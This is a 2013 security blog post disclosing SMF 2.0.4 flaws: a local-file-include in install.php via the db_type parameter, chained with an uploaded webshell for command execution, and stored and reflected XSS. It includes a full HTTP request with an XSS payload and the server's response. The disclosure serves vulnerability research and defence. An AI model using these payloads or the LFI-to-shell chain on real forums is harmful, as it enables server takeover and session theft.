=== Content from hauntit.blogspot.com_5c97c8b7_20250125_170032.html ===


# [Haunt IT](http://hauntit.blogspot.com/)

HauntIT Blog - security testing & exploit development

## Sunday, 14 April 2013

### [EN] SMF 2.0.4 - full disclosure

Hi,

as I said [few days ago](http://hauntit.blogspot.com/2013/03/en-few-updates.html), I found few vulnerabilities in latest [SMF](http://download.simplemachines.org/).

First of all, let's check a [local file include](http://en.wikipedia.org/wiki/File_inclusion_vulnerability) vulnerability.

If admin will not delete the install.php file after installation, attacker is able to run command and compromise

the server. Idea is simple. User who is able to put php-file (with webshell) at SMF-installed-server,

can exploit a require\_once() function to get a shell at remote host.

In install.php file you have a not filtered POST parameter, db\_type. If you will set value of this parameter to

your 'evilshell', then you can run commands. Check it out:

|  |
| --- |
| LFI to RCE in install.php |  |

That's right. Vulnerable line in install.php is 357:

(...)

 require\_once($sourcedir . '/Subs-Db-'. $db\_type . '.php');

(...)

Another nice idea is to put [persistent XSS](http://en.wikipedia.org/wiki/Cross-site_scripting) code in SMF.

Here I will present only persistent XSS for admin user.  (Maybe in the future, I will add here stored XSS code for normal user too, because I found that too.) If admin is logged in, he can create a new board.

'board\_name' is vulnerable because we can put here unfiltered  code to exploit XSS vulnerability.

Code will be added permanently. Look at this:

|  |
| --- |
| Vulnerable board\_name |  |

and successfully added code below:

|  |
| --- |
| Stored XSS |  |  |  |  |

\* Update 15.04.2013 \*

Another XSS for normal (registered) user is described below.

First you will see request for SMF, and second is response (part of it):

1. xss:
request:

POST /kuba/14.04/smf\_2.0.4/index.php?action=pm;sa=settings;save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/kuba/14.04/smf\_2.0.4/index.php?action=pm;sa=settings
Cookie: SMFCookie956=a%3A4%3A%7Bi%3A0%3Bs%3A1%3A%222%22%3Bi%3A1%3Bs%3A40%3A%2266a7209472fa1c52741c57363dfb6acab71256c4%22%3Bi%3A2%3Bi%3A1555224490%3Bi%3A3%3Bi%3A3%3B%7D; PHPSESSID=hnfbpm852gmk94s53u5tt7jr23

Content-Type: multipart/form-data; boundary=---------------------------96503762710472713441302808443
Connection: close
Content-Length: 1373

-----------------------------96503762710472713441302808443
Content-Disposition: form-data; name="pm\_prefs"
0

-----------------------------96503762710472713441302808443

Content-Disposition: form-data; name="default\_options[view\_newest\_pm\_first]"
0

-----------------------------96503762710472713441302808443
Content-Disposition: form-data; name="pm\_receive\_from"
1

-----------------------------96503762710472713441302808443
Content-Disposition: form-data; name="pm\_email\_notify"
1

-----------------------------96503762710472713441302808443
Content-Disposition: form-data; name="default\_options[popup\_messages]"
0

-----------------------------96503762710472713441302808443
Content-Disposition: form-data; name="default\_options[copy\_to\_outbox]"
0

-----------------------------96503762710472713441302808443
Content-Disposition: form-data; name="default\_options[pm\_remove\_inbox\_label]"
0

-----------------------------96503762710472713441302808443
Content-Disposition: form-data; name="dc64ddea87"
a6e91d0ace8c74a87548a48274ac142a

-----------------------------96503762710472713441302808443
Content-Disposition: form-data; name="u"
2

-----------------------------96503762710472713441302808443
Content-Disposition: form-data; name="sa"
"><img/src="x"/onerror="alert(123)"><

-----------------------------96503762710472713441302808443--

Response for that, should be similar to this one:
(...)
        </ul>
    </div>
    <a href="http://localhost/kuba/14.04/smf\_2.0.4/index.php?action=pm;sa="><img/src="x"/onerror="alert(123)"><;f=inbox;l=-1;togglebar"><img id="menu\_toggle" src="http://localhost/kuba/14.04/smf\_2.0.4/Themes/default/images/admin/change\_menu.png" alt="\*" /></a>
<div id="admin\_menu">
    <ul class="dropmenu" id="dropdown\_menu\_1">
(...)

And view from Burp:

|  |
| --- |
| SMF 2.0.4 XSSed again |

This post will be updated as soon as I will finish tests for admin user too because I think there is a nice add-shell-via-csrf vulnerability. But I must retest it to be 100% sure. :)

Enjoy o/

Posted by

[Haunt IT](https://www.blogger.com/profile/13117928524379118605 "author profile")

at

[02:56](http://hauntit.blogspot.com/2013/04/en-smf-204-full-disclosure.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=170839649422349874&postID=193755858322322709&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=170839649422349874&postID=193755858322322709&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=170839649422349874&postID=193755858322322709&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=170839649422349874&postID=193755858322322709&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=170839649422349874&postID=193755858322322709&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=170839649422349874&postID=193755858322322709&target=pinterest "Share to Pinterest")

Labels:
[0day](http://hauntit.blogspot.com/search/label/0day),
[code review](http://hauntit.blogspot.com/search/label/code%20review),
[exploit](http://hauntit.blogspot.com/search/label/exploit),
[smf exploit](http://hauntit.blogspot.com/search/label/smf%20exploit),
[vulnerability](http://hauntit.blogspot.com/search/label/vulnerability)

#### No comments:

#### Post a Comment

What do You think...?

[Newer Post](http://hauntit.blogspot.com/2013/04/en-kohana-framework-234-0day.html "Newer Post")

[Older Post](http://hauntit.blogspot.com/2013/03/en-phpbb-idea.html "Older Post")

[Home](http://hauntit.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](http://hauntit.blogspot.com/feeds/193755858322322709/comments/default)

## Choose

* [Home](http://hauntit.blogspot.com/)
* [Public (16.05)](http://hauntit.blogspot.com/p/public-3107.html)
* [Mini arts](http://hauntit.blogspot.com/p/mini-arts.html)
* [Contact](http://hauntit.blogspot.com/p/contact_23.html)

## Blog Archive

* ►
  [2016](http://hauntit.blogspot.com/2016/)
  (7)
  + ►
    [May](http://hauntit.blogspot.com/2016/05/)
    (5)
  + ►
    [April](http://hauntit.blogspot.com/2016/04/)
    (1)
  + ►
    [March](http://hauntit.blogspot.com/2016/03/)
    (1)

* ►
  [2015](http://hauntit.blogspot.com/2015/)
  (19)
  + ►
    [December](http://hauntit.blogspot.com/2015/12/)
    (2)
  + ►
    [October](http://hauntit.blogspot.com/2015/10/)
    (2)
  + ►
    [June](http://hauntit.blogspot.com/2015/06/)
    (1)
  + ►
    [May](http://hauntit.blogspot.com/2015/05/)
    (2)
  + ►
    [April](http://hauntit.blogspot.com/2015/04/)
    (2)
  + ►
    [March](http://hauntit.blogspot.com/2015/03/)
    (3)
  + ►
    [February](http://hauntit.blogspot.com/2015/02/)
    (2)
  + ►
    [January](http://hauntit.blogspot.com/2015/01/)
    (5)

* ►
  [2014](http://hauntit.blogspot.com/2014/)
  (47)
  + ►
    [December](http://hauntit.blogspot.com/2014/12/)
    (2)
  + ►
    [May](http://hauntit.blogspot.com/2014/05/)
    (1)
  + ►
    [April](http://hauntit.blogspot.com/2014/04/)
    (3)
  + ►
    [March](http://hauntit.blogspot.com/2014/03/)
    (4)
  + ►
    [February](http://hauntit.blogspot.com/2014/02/)
    (32)
  + ►
    [January](http://hauntit.blogspot.com/2014/01/)
    (5)

* ▼
  [2013](http://hauntit.blogspot.com/2013/)
  (56)
  + ►
    [December](http://hauntit.blogspot.com/2013/12/)
    (1)
  + ►
    [November](http://hauntit.blogspot.com/2013/11/)
    (2)
  + ►
    [October](http://hauntit.blogspot.com/2013/10/)
    (4)
  + ►
    [September](http://hauntit.blogspot.com/2013/09/)
    (3)
  + ►
    [August](http://hauntit.blogspot.com/2013/08/)
    (4)
  + ►
    [July](http://hauntit.blogspot.com/2013/07/)
    (3)
  + ►
    [June](http://hauntit.blogspot.com/2013/06/)
    (5)
  + ►
    [May](http://hauntit.blogspot.com/2013/05/)
    (5)
  + ▼
    [April](http://hauntit.blogspot.com/2013/04/)
    (8)
    - [gpEasy 3.6 HTML Injection](http://hauntit.blogspot.com/2013/04/gpeasy-36-html-injection.html)
    - [[EN] p0c php injection in SMF 2.0.4](http://hauntit.blogspot.com/2013/04/en-p0c-php-injection-in-smf-204.html)
    - [[EN] Aspen 0.8 directory Traversal PoC](http://hauntit.blogspot.com/2013/04/en-aspen-08-directory-traversal-poc.html)
    - [[EN] Way of attack via SQL Injection](http://hauntit.blogspot.com/2013/04/en-way-of-attack-via-sql-injection.html)
    - [[EN] MyBB 1.6.10 Released – Security & Maintenance...](http://hauntit.blogspot.com/2013/04/en-mybb-1610-released-security.html)
    - [[EN] SMF 2.0.4 - PHP Injection](http://hauntit.blogspot.com/2013/04/en-smf-204-php-injection.html)
    - [[EN] Kohana Framework 2.3.4 0day](http://hauntit.blogspot.com/2013/04/en-kohana-framework-234-0day.html)
    - [[EN] SMF 2.0.4 - full disclosure](http://hauntit.blogspot.com/2013/04/en-smf-204-full-disclosure.html)
  + ►
    [March](http://hauntit.blogspot.com/2013/03/)
    (12)
  + ►
    [February](http://hauntit.blogspot.com/2013/02/)
    (2)
  + ►
    [January](http://hauntit.blogspot.com/2013/01/)
    (7)

* ►
  [2012](http://hauntit.blogspot.com/2012/)
  (128)
  + ►
    [December](http://hauntit.blogspot.com/2012/12/)
    (21)
  + ►
    [November](http://hauntit.blogspot.com/2012/11/)
    (1)
  + ►
    [September](http://hauntit.blogspot.com/2012/09/)
    (1)
  + ►
    [August](http://hauntit.blogspot.com/2012/08/)
    (6)
  + ►
    [July](http://hauntit.blogspot.com/2012/07/)
    (4)
  + ►
    [June](http://hauntit.blogspot.com/2012/06/)
    (3)
  + ►
    [May](http://hauntit.blogspot.com/2012/05/)
    (4)
  + ►
    [April](http://hauntit.blogspot.com/2012/04/)
    (37)
  + ►
    [March](http://hauntit.blogspot.com/2012/03/)
    (33)
  + ►
    [February](http://hauntit.blogspot.com/2012/02/)
    (10)
  + ►
    [January](http://hauntit.blogspot.com/2012/01/)
    (8)

* ►
  [2011](http://hauntit.blogspot.com/2011/)
  (17)
  + ►
    [December](http://hauntit.blogspot.com/2011/12/)
    (2)
  + ►
    [November](http://hauntit.blogspot.com/2011/11/)
    (6)
  + ►
    [October](http://hauntit.blogspot.com/2011/10/)
    (3)
  + ►
    [September](http://hauntit.blogspot.com/2011/09/)
    (6)

## I like this blog:

* ![]()

  [Full Disclosure](https://seclists.org/#fulldisclosure)
* ![]()

  [gynvael.coldwind//vx.log (pl)](https://gynvael.coldwind.pl/)
* ![]()

  [hasherezade's 1001 nights](https://hshrzd.wordpress.com)
* ![]()

  [Niebezpiecznik.pl](https://niebezpiecznik.pl)
* ![]()

  [sekurak.pl](http://sekurak.pl/)
* ![]()

  [Zaufana Trzecia Strona](https://zaufanatrzeciastrona.pl)

|  |  |
| --- | --- |

## Labels

* [0day](http://hauntit.blogspot.com/search/label/0day)
* [art](http://hauntit.blogspot.com/search/label/art)
* [banks security](http://hauntit.blogspot.com/search/label/banks%20security)
* [bugbounty](http://hauntit.blogspot.com/search/label/bugbounty)
* [code review](http://hauntit.blogspot.com/search/label/code%20review)
* [exploit](http://hauntit.blogspot.com/search/label/exploit)
* [jsp](http://hauntit.blogspot.com/search/label/jsp)
* [kohana](http://hauntit.blogspot.com/search/label/kohana)
* [LinkedIn](http://hauntit.blogspot.com/search/label/LinkedIn)
* [linux](http://hauntit.blogspot.com/search/label/linux)
* [Mantis](http://hauntit.blogspot.com/search/label/Mantis)
* [note](http://hauntit.blogspot.com/search/label/note)
* [osCommerce](http://hauntit.blogspot.com/search/label/osCommerce)
* [OTRS](http://hauntit.blogspot.com/search/label/OTRS)
* [patching](http://hauntit.blogspot.com/search/label/patching)
* [phpMyAdmin](http://hauntit.blogspot.com/search/label/phpMyAdmin)
* [projects](http://hauntit.blogspot.com/search/label/projects)
* [python webscanner](http://hauntit.blogspot.com/search/label/python%20webscanner)
* [rce](http://hauntit.blogspot.com/search/label/rce)
* [research](http://hauntit.blogspot.com/search/label/research)
* [sql injection](http://hauntit.blogspot.com/search/label/sql%20injection)
* [tools](http://hauntit.blogspot.com/search/label/tools)
* [vBulletin](http://hauntit.blogspot.com/search/label/vBulletin)
* [vulnerability](http://hauntit.blogspot.com/search/label/vulnerability)
* [vulnerable WP plugins](http://hauntit.blogspot.com/search/label/vulnerable%20WP%20plugins)
* [webgoat](http://hauntit.blogspot.com/search/label/webgoat)
* [Wordpress](http://hauntit.blogspot.com/search/label/Wordpress)

## About Me

[Haunt IT](https://www.blogger.com/profile/13117928524379118605)

"Ask for more" ;)

[View my complete profile](https://www.blogger.com/profile/13117928524379118605)

|  |  |
| --- | --- |

Simple theme. Theme images by [Petrovich9](http://www.istockphoto.com/googleimages.php?id=5580858&platform=blogger&langregion=en_GB). Powered by [Blogger](https://www.blogger.com).


